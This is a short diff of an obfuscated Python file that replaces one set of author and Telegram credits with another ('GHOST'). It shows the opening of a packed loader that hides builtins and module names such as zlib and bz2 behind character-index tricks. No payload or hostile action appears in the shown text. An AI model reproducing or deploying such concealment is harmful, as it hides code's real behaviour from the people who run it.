@@ -1,9 +1,9 @@
 
 # ════════════════════
-__ENC_AUTHOR__ = "STEIN"
-__TELEGRAM__ = "@rejerk"
-__GROUP_CHAT__ = "@keped"
+__ENC_OWNER = "GHOST"
+__TG = "@GHOST_OWNS"
 # ════════════════════
+
 
 
 stein_kgjomj=(lambda b:getattr(b,''.join([chr(115),chr(116),chr(114)]))if not isinstance(b,dict)else b[''.join([chr(115),chr(116),chr(114)])])(__builtins__);stein_ygahzh=(lambda b:getattr(b,''.join([chr(98),chr(121),chr(116),chr(101),chr(115)]))if not isinstance(b,dict)else b[''.join([chr(98),chr(121),chr(116),chr(101),chr(115)])])(__builtins__);stein_lrkfrj=(lambda b:getattr(b,''.join([chr(99),chr(104),chr(114)]))if not isinstance(b,dict)else b[''.join([chr(99),chr(104),chr(114)])])(__builtins__);stein_tzyfbk=(lambda b:getattr(b,''.join([chr(105),chr(110),chr(116)]))if not isinstance(b,dict)else b[''.join([chr(105),chr(110),chr(116)])])(__builtins__);stein_zsimoh=(lambda b:getattr(b,''.join([chr(108),chr(105),chr(115),chr(116)]))if not isinstance(b,dict)else b[''.join([chr(108),chr(105),chr(115),chr(116)])])(__builtins__);stein_aihpsb=(lambda b:getattr(b,''.join([chr(109),chr(97),chr(112)]))if not isinstance(b,dict)else b[''.join([chr(109),chr(97),chr(112)])])(__builtins__);_stein_rejerk=['stein_rejerk_6e3o99hacuyuk5uz','stein_rejerk_ypc5hd0yqfpkvx7z','stein_rejerkmjk73bh4j75r5g0bc','stein_rejerk_2c313hudoakxq1dx','stein_rejerk_4k4da5t5wvxlhd93','stein_rejerk_ui4fd348bq10uq2t','stein_rejerk_46laswq29si9s9zv','stein_rejerk_wx80g9ksl2wupxki','stein_rejerk_61ickp7dxwpe8rbe'];qzkhbhjz=__import__(_stein_rejerk[1][28]+_stein_rejerk[6][15]+_stein_rejerk[0][3]+_stein_rejerk[5][21]);yqqgqvry=__import__(_stein_rejerk[8][27]+_stein_rejerk[0][28]+_stein_rejerk[7][22]);qfgdgjkh=__import__(_stein_rejerk[5][21]+_stein_rejerk[3][22]+_stein_rejerk[6][17]+_stein_rejerk[5][2]+_stein_rejerk[6][14]+_stein_rejerk[5][15]);krmoxpal=__import__(_stein_rejerk[8][27]+_stein_rejerk[0][22]+_stein_rejerk[7][28]+_stein_rejerk[7][21]+_stein_rejerk[7][1]+_stein_rejerk[7][3]+_stein_rejerk[5][4]+_stein_rejerk[5][0]);uofuynepu={}
